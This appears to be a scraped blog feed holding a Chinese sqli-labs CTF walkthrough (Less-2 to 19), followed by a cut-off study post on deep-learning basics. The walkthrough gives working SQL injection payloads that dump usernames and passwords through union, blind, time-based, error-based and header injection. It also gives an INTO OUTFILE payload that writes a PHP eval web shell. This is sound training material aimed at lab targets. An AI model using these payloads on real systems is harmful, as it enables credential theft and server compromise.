href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>往下操作与第一题类似，payload就差了一个单引号</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" srcset="data:image/png;base64,666" alt="Ga9bjv.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" srcset="data:image/png;base64,666" alt="Ga9NuR.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1</a></em></strong></p><hr><ul><li><p>该题为字符型注入，但直接使用联合注入报错</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" srcset="data:image/png;base64,666" alt="Ga90Nn.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" srcset="data:image/png;base64,666" alt="Ga9vRP.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>往下与第一题相同，union后的payload一致</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" srcset="data:image/png;base64,666" alt="Ga9wA6.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" srcset="data:image/png;base64,666" alt="Ga98Ih.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1</a></em></strong></p><hr><ul><li><p>使用单引号进行闭合，报错</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" srcset="data:image/png;base64,666" alt="Ga9I10.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+</a></em></strong></p><hr><ul><li><p>组合单引号、双引号以及括号得到注入点</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" srcset="data:image/png;base64,666" alt="Ga97r5.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;</a>) union select 1,2,3–+</em></strong></p><hr><ul><li><p>往下步骤与上述题目相同</p><p><img src="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" srcset="data:image/png;base64,666" alt="Ga96lm.png"></p></li></ul><p><strong><em>payload：<a href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p><hr><h2 id="Less-05"><a href="#Less-05" class="headerlink" title="Less-05"></a>Less-05</h2><ul><li><p>判断为字符型注入还是数字型注入</p><p>回显报错数据，尝试盲注</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetUSz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetUSz.png" srcset="data:image/png;base64,666" alt="GetUSz.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27%20and%20select%201,2,3--+</a></p><hr><ul><li><p>对查询结果进行切片，再与各个字符比较，根据报错与否判断比较结果</p><p><img src="https://www.helloimg.com/images/2021/12/05/Get68n.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/Get68n.png" srcset="data:image/png;base64,666" alt="Get68n.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li><p>改变上一个payload中c的值以遍历出数据库名称，再结合前面题目的payload逐步爆出表名和列名</p><p><img src="https://www.helloimg.com/images/2021/12/05/GetKoR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/05/GetKoR.png" srcset="data:image/png;base64,666" alt="GetKoR.png"></p></li></ul><p><strong>payload</strong>：<a href="http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+">http://bb14e092-f5e9-4e78-83cb-bc6ded391eb2.node4.buuoj.cn/Less-5/?id=1%27and%20substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%22security%22),1,1)=%27e%27--+</a></p><hr><ul><li>列名以此类推</li></ul><p>可以用python写个脚本来跑，或者使用burpsuite</p><p>另外，还可以使用updataxml()函数来获取相关信息</p><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3aM0.png" srcset="data:image/png;base64,666" alt="Gi3aM0.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-5/?id=1%27and%20updatexml(1,concat(0x7e,(SELECT%20@@datadir),0x7e),1)--+</a></p><hr><h2 id="Less-06"><a href="#Less-06" class="headerlink" title="Less-06"></a>Less-06</h2><p>与上一道题类似，将单引号换为双引号</p><hr><h2 id="Less-07"><a href="#Less-07" class="headerlink" title="Less-07"></a>Less-07</h2><ul><li>利用永真永假的条件配合and和or判断参数id的闭合方式</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi318m.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi318m.png" srcset="data:image/png;base64,666" alt="Gi318m.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1%27))%20and%201=1--+</a></p><hr><ul><li>利用select xxx into outfile xxx/xxx的方式向服务器中写入文件，文件内容为一句话木马</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/Gi3PX5.png" srcset="data:image/png;base64,666" alt="Gi3PX5.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-7/?id=1&#39;</a>)) union select 1,’2’,”<?php @eval($_POST['hahaha'];)?>“ into outfile “./“ –+</p><p>由于不知道网站的根目录，所以目前无法对传入文件的成功与否做出判断</p><hr><h2 id="Less-08"><a href="#Less-08" class="headerlink" title="Less-08"></a>Less-08</h2><ul><li>判断参数闭合方式</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXeU9.png" srcset="data:image/png;base64,666" alt="GiXeU9.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27%20or%201=1%20--+</a></p><hr><ul><li>由于注入错误时不回显，因此可以使用上述的盲注</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXEng.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXEng.png" srcset="data:image/png;base64,666" alt="GiXEng.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-8/?id=1%27and%20substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27--+</a></p><hr><ul><li>往后步骤与上述盲注步骤一致</li></ul><hr><h2 id="Less-09"><a href="#Less-09" class="headerlink" title="Less-09"></a>Less-09</h2><ul><li>在判断参数闭合方式时，发现回显不改变</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiX3qE.png" srcset="data:image/png;base64,666" alt="GiX3qE.png"></p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%201=2--+</a></p><hr><ul><li>尝试基于时间的盲注</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXxPX.png" srcset="data:image/png;base64,666" alt="GiXxPX.png"></p><p>可以看到网页根据设定的时间正在加载，说明注入成功</p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if(1,sleep(3),1)--+</a></p><hr><ul><li>接下来只需要将sleep函数的第一个参数替换为payload，即可根据网页响应时间判断结果</li></ul><p><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"><img src="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/12/GiXXTY.png" srcset="data:image/png;base64,666" alt="GiXXTY.png"></p><p>payload取上述盲注payload的查询部分</p><p><strong>payload</strong>：<a href="http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+">http://3ac97a07-8597-4e0b-9689-f364b63dc003.node4.buuoj.cn/Less-9/?id=1%27%20and%20if((substr((select%20group_concat(schema_name)%20from%20information_schema.schemata),1,1)=%27c%27),sleep(3),1)--+</a></p><hr><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><ul><li>将闭合参数的单引号替换为双引号，其余一致</li></ul><hr><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>这道题是使用post方式提交数据的，在多次尝试以及上网找资料之后，发现有两点需要注意</p><ul><li>不可以直接将url编码之后的数据（如%20）直接提交</li><li>最后的注释不可以用“–+”，而应该用“#”</li></ul><p><img src="https://www.helloimg.com/images/2021/12/19/GvklDS.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvklDS.png" srcset="data:image/png;base64,666" alt="GvklDS.png"></p><p>上面这样注释是行不通的，用“#”代替“–+”之后如下图</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkHao.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkHao.png" srcset="data:image/png;base64,666" alt="GvkHao.png"></p><p>然后再用之前写过的题当中出现的联合注入</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvkigb.png" srcset="data:image/png;base64,666" alt="Gvkigb.png"></p><p><img src="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvkbHD.png" srcset="data:image/png;base64,666" alt="GvkbHD.png"></p><hr><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>原理同上一题一致，唯一差别是闭合方式不同</p><p><a href="https://www.helloimg.com/image/GvraLC"><img src="https://www.helloimg.com/images/2021/12/19/GvraLC.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvraLC.png" srcset="data:image/png;base64,666" alt="GvraLC.png"></a></p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvr1NQ.png" srcset="data:image/png;base64,666" alt="Gvr1NQ.png"></p><hr><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>这道题的闭合方式与上一道题目比较相似，只不过把双引号替换为单引号，比较不一样的是这道题不可以使用上一道题的联合注入，可以使用报错注入，具体的payload可参照上述题目有关报错注入的部分</p><p>下图是联合注入后无回显的结果</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhw7o.png" srcset="data:image/png;base64,666" alt="Gvhw7o.png"></p><hr><p>这里使用了报错注入返回了mysql的绝对路径</p><p><strong>payload</strong>：1’) and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhNBD.png" srcset="data:image/png;base64,666" alt="GvhNBD.png"></p><hr><p>这里查询到了当前的数据库</p><p><img src="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/Gvhvnb.png" srcset="data:image/png;base64,666" alt="Gvhvnb.png"></p><hr><p>需要注意的是由于返回长度的限制，回显无法显示所有的结果，可以根据payload作相应调整</p><p><strong>payload</strong>：1’) and updatexml(1,concat(0x7e,(select group_concat(username,password) from security.users),0x7e),1)#</p><p><img src="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/19/GvhdFK.png" srcset="data:image/png;base64,666" alt="GvhdFK.png"></p><hr><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>这道题与上一道题类似，唯一不同的仍是闭合方式不同</p><hr><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>这道题考察的是post方式的基于时间的盲注</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtNsK.png" srcset="data:image/png;base64,666" alt="GQtNsK.png"></p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtvzT.png" srcset="data:image/png;base64,666" alt="GQtvzT.png"></p><p>一开始依然先判断闭合方式</p><hr><p>然后用if语句构造基于时间的盲注</p><p>这里无需关注是否登录成功，只需关注响应时间</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQtQvb.png" srcset="data:image/png;base64,666" alt="GQtQvb.png"></p><hr><p>然后根据上述题目中有关基于时间的盲注有关的题目的payload进行注入</p><p><strong>payload</strong>：1’ or if((substr((select group_concat(schema_name) from information_schema.schemata),1,1)=’c’),sleep(2),1) #</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQt0B1.png" srcset="data:image/png;base64,666" alt="GQt0B1.png"></p><hr><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>这道题与上一道题目差不多，唯一区别仍是闭合方式不同</p><hr><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这道题涉及到了sql语句中update部分，模拟的是在登录成功后修改密码时的注入</p><p>这里由于无法回显闭合方式是否正确，故使用基于时间的盲注中的小技巧进行判断</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAE1g.png" srcset="data:image/png;base64,666" alt="GQAE1g.png"></p><hr><p>往下的过程涉及到<strong>子查询</strong>的概念，即以查询的结果作为下一次查询的范围</p><p>查数据库</p><p><img src="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQAm6P.png" srcset="data:image/png;base64,666" alt="GQAm6P.png"></p><hr><p>往后只需将select database()替换为先前题目中相应的payload即可</p><p><a href="https://www.helloimg.com/image/GQALuz"><img src="https://www.helloimg.com/images/2021/12/25/GQALuz.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/12/25/GQALuz.png" srcset="data:image/png;base64,666" alt="GQALuz.png"></a></p><hr><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一开始给出了本机的ip地址，意义不明（估计是提示可以注入某些类型的信息以执行）</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPBct.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPBct.png" srcset="data:image/png;base64,666" alt="GzPBct.png"></p><p>再经过对username和password的多次注入后发现没有什么效果，尝试登录</p><hr><p><img src="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPR3v.png" srcset="data:image/png;base64,666" alt="GzPR3v.png"></p><p>可以看出登录后回显了user agent，则可以通过抓包修改user agent的方式注入</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPZME.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPZME.png" srcset="data:image/png;base64,666" alt="GzPZME.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPCru.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPCru.png" srcset="data:image/png;base64,666" alt="GzPCru.png"></p><p><strong>payload</strong>：’and updatexml(1,concat(0x7e,database(),0x7e),1) or ‘</p><hr><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>这道题与上一道差不多，只不过修改的是Referer字段</p><p><img src="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPJXR.png" srcset="data:image/png;base64,666" alt="GzPJXR.png"><br><img src="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2022/01/02/GzPxVn.png" srcset="data:image/png;base64,666" alt="GzPxVn.png"></p><p><strong>payload</strong>：与上一道题一致</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf、web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch 2</title>
      <link href="2021/11/29/deep_learning_from_scratch_2/"/>
      <url>2021/11/29/deep_learning_from_scratch_2/</url>
      
        <content type="html"><![CDATA[<h2 id="在”手写数字识别”中"><a href="#在”手写数字识别”中" class="headerlink" title="在”手写数字识别”中"></a>在”手写数字识别”中</h2><a id="more"></a><ul><li><p>了解到了mnist数据集</p></li><li><p>对运算过程中运算的具体对象有点问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"></span><br><span class="line">sys.path.append(os.pardir)</span><br><span class="line"><span class="keyword">from</span> dataset.mnist <span class="keyword">import</span> load_mnist</span><br><span class="line"></span><br><span class="line">(x_train, t_train), (x_test, t_test) = load_mnist(flatten=<span class="literal">True</span>, normalize=<span class="literal">False</span>) <span class="comment">#一开始不知道这是什么意思</span></span><br><span class="line"></span><br><span class="line">print(x_train.shape)</span><br><span class="line">print(t_train.shape)</span><br><span class="line">print(x_test.shape)</span><br><span class="line">print(t_test.shape)</span><br></pre></td></tr></table></figure></li></ul><p>对于代码中出现的两个元组，一开始不知道 t_train t_test 代表什么，在纠结了一段时间后终于明白了</p><p>x_train 是训练用的图像数据</p><p>t_train 是训练图像的解，即每个图像对应的数字</p><p>x_test 是用于测试的图像数据</p><p>t_test 是测试图像的解，即每个图像对应的数字</p><ul><li><p>认识了正规化、预处理和 one-hot 表示法</p><p>正规化指的是将数据进行转化，如对图像的每个像素数值除以256，使其数值在0到1之间，方便后续运算</p><p>预处理，顾名思义，就是在运算之前对数据进行转换，如正规化等</p><p>one-hot 表示法是指对运算结果只将 解 所对应的值设为1，即将 解 作为索引，设置该索引的值为1；在对图像进行预测的脚本中，获取解的过程便是基于one-hot表示法的，如下 p= np.argmax(y)</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    y = predict(network, x[i])</span><br><span class="line">    p= np.argmax(y) <span class="comment"># 获取概率最高的元素的索引</span></span><br><span class="line">    <span class="keyword">if</span> p == t[i]:</span><br><span class="line">        accuracy_cnt += <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><p>另外，在阅读到设计神经网络时，学到了有关输入层和输出层与数据之间的关系</p><p>输入层为待训练数据的大小，如训练手写数字识别时输入层为784，即为训练图像的大小</p><p>输出层为分类数目，如训练的手写数字结果只有0到9十种可能，故将输出层设为十</p></li></ul><h2 id="在“从数据中学习”中"><a href="#在“从数据中学习”中" class="headerlink" title="在“从数据中学习”中"></a>在“从数据中学习”中</h2><ul><li><p>认识了许多概念</p><h3 id="特征量"><a href="#特征量" class="headerlink" title="特征量"></a>特征量</h3></li></ul><blockquote><p>特征量是指可以从输入数据中准确地提取本质数据的转换器，通常表示为向量形式</p></blockquote><p>特征量是由人设计的</p><p>不同问题对应不同特征量</p><p>深度学习中特征量是由机器来学习的</p><h3 id="泛化能力"><a href="#泛化能力" class="headerlink" title="泛化能力"></a>泛化能力</h3><blockquote><p>泛化能力是指处理未被观察过的数据（不包含在训练数据中的数据）的能力</p></blockquote><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><blockquote><p>只对某个数据集过度拟合的状态称为过拟合</p></blockquote><p>可以理解为训练的模型只对某个数据集起作用</p><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><blockquote><p>损失函数是表示神经网络性能的“恶劣程度”的指标，即当前的神经网络对监督数据在多大程度上不拟合，在多大程度上不一致</p></blockquote><h3 id="均方误差"><a href="#均方误差" class="headerlink" title="均方误差"></a>均方误差</h3><p>$$<br>E=\frac{1}{2}\Sigma_k(y_k-t_k)^2<br>$$</p><p>这里y_k表示神经网络的输出，t_k表示监督数据，k表示数据维数</p><h3 id="交叉熵误差"><a href="#交叉熵误差" class="headerlink" title="交叉熵误差"></a>交叉熵误差</h3><p>$$<br>E=-\Sigma_kt_k\log{y_k}<br>$$</p><h3 id="损失函数的意义"><a href="#损失函数的意义" class="headerlink" title="损失函数的意义"></a>损失函数的意义</h3><p>个人认为，损失函数存在的意义是作为模型调参结果的重要指标，由于测试精度的变化是不连续的（因为测试数据有限，测试结果的精度就取决于测试数据的多少），故无法体现模型调参后微小的变化，而损失函数是连续的，任何微小的改动都可能改变损失函数的结果（可以认为损失函数的精度比测试结果的精度高得多），故需要损失函数来衡量调参后的结果</p><h3 id="数值微分"><a href="#数值微分" class="headerlink" title="数值微分"></a>数值微分</h3><blockquote><p>利用某个给定的微小值的差分求导数的过程，称为数值微分</p></blockquote><ul><li><p>导数与偏导数的定义</p></li><li><p>梯度及梯度法</p><blockquote><p><strong>梯度法</strong>：函数的取值从当前位置沿着梯度方向前进一段距离，然后在新的地方重新求梯度，再沿着新梯度方向前进，逐渐减小函数值</p></blockquote></li></ul><h3 id="学习算法（随机梯度下降法）的实现"><a href="#学习算法（随机梯度下降法）的实现" class="headerlink" title="学习算法（随机梯度下降法）的实现"></a>学习算法（随机梯度下降法）的实现</h3><p>神经网络的学习步骤：</p><ul><li><p>前提</p><p>神经网络存在合适的权重和偏置，调整权重和偏置以便拟合训练数据的过程称为“学习”</p></li><li><p>步骤1（mini-batch）</p><p>从训练数据中随机选出一部分数据，这部分数据称为mini-batch。我们的目标是减小mini-batch的损失函数的值</p></li><li><p>步骤2（计算梯度）</p><p>为了减小mini-batch的损失函数的值，需要求出各个权重参数的梯度。梯度表示损失函数的值减小最多的方向</p></li><li><p>步骤3（更新参数）</p><p>将权重参数沿梯度方向进行微小更新</p></li><li><p>步骤4（重复）</p><p>重复步骤1、步骤2、步骤3</p></li></ul><blockquote><p><strong>epoch</strong>： epoch是一个单位，一个epoch表示学习中所有训练数据均被使用过一次时的更新次数</p></blockquote><h2 id="误差方向传播法"><a href="#误差方向传播法" class="headerlink" title="误差方向传播法"></a>误差方向传播法</h2><h3 id="计算图"><a href="#计算图" class="headerlink" title="计算图"></a>计算图</h3><p>了解正向传播、反向传播及局部计算的定义</p><h3 id="链式法则"><a href="#链式法则" class="headerlink" title="链式法则"></a>链式法则</h3><p>复合函数导数的定义</p><blockquote><p>如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示</p></blockquote><p>链式法则是关于复合函数的导数的性质</p><h3 id="反向传播"><a href="#反向传播" class="headerlink" 